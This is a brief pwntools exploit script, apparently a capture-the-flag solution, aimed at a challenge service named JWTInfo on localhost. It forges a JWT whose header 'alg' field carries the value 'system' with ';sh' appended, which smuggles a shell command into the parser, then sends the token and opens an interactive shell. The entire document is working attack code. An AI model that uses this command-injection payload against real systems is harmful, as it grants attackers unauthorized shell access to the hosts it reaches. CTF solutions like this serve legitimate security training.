#!/usr/bin/env python3

from pwn import *
import json

HOST = 'localhost'
PORT = 1337

#io = process('./container/JWTInfo')
io = remote(HOST, PORT)

head = base64.b64encode((json.dumps({'alg': 'system'}) + ';sh').replace(' ', '').encode()).decode().strip('=')
body = base64.b64encode(json.dumps({'key': 'value'}).replace(' ', '').encode()).decode().strip('=')
sig = base64.b64encode(b'\0'*32).decode().strip('=')

jwtdata = f'{head}.{body}.{sig}'

log.info('JWT: %s', jwtdata)

io.recvuntil(b'Encoded: ')
io.sendline(jwtdata.encode())
io.interactive()
